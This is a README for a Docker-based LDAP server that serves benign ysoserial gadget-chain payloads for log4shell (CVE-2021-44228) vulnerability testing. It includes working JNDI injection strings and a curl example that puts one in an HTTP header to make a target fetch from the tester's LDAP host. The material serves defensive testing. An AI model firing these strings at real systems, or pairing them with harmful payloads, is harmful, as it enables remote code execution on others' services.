# Description
A simple java LDAP host that will respond to a JNDI request with a benign jdk11+ gadget chain payload. Useful for generating log4shell (Log4j RCE CVE-2021-44228) exploit logs, and testing if your services are vulnerable to a set of well-known follow-up gadget chains that are needed to exploit this vulnerability on newer jdk versions.

## Payloads
The pre-packaged exploit payloads simply run `touch /<payload name>.txt`, e.g. `touch /CommonsCollections6.txt` on the target. This is meant to be an innocuous indicator that a system is vulnerable to a post-exploit gadget chain. They were generated with [ysoserial](https://github.com/frohoff/ysoserial).

# Usage

## Build
`docker-compose build`

## Run
`docker-compose up`

## Do
1. Optional: Pick a payload from the list of gadget chains available in [ysoserial](https://github.com/frohoff/ysoserial).
   * Based on my testing, CommonsCollections5 and CommonsCollections6 work against recent verions of tomcat 8.
   * If you don't specify a payload log4dap will send an empty reply. But you will know the target attempted to load a class, which tells you you're vulnerable to malicious requests.
2. Build your malicious request string with the host IP of the machine running this container and the name of the ysoserial payload you wish to use, if any.
   * `${jndi:ldap://<host.ip.address>:1337/[gadget chain payload>]`
   * `${jndi:ldap://192.168.1.5:1337/CommonsCollections6}`
3. Use any of the many mechanisms at your disposal to attempt to trigger the log4shell exploit with that string.
4. Check your target systems logs for evidence of the exploit attempt. @Neo23x0's [log4shell-detector](https://github.com/Neo23x0/log4shell-detector) is good for this.

#### Example
`curl  -H '<some header you're testing> : ${jndi:ldap://192.168.1.5:1337/CommonsCollections6}' http://target.hostname/some/endpoint`

## Screenshots

![ldap response](/screenshots/ldap_request.png)

![exploited](/screenshots/exploited.png)

## Credits

This is based almost entirely on the work shared [here](https://www.cnblogs.com/yyhuni/p/15088134.html) ([english version](https://www.cnblogs.com/yyhuni/p/15088134.html)), as well as [ysoserial](https://github.com/frohoff/ysoserial).
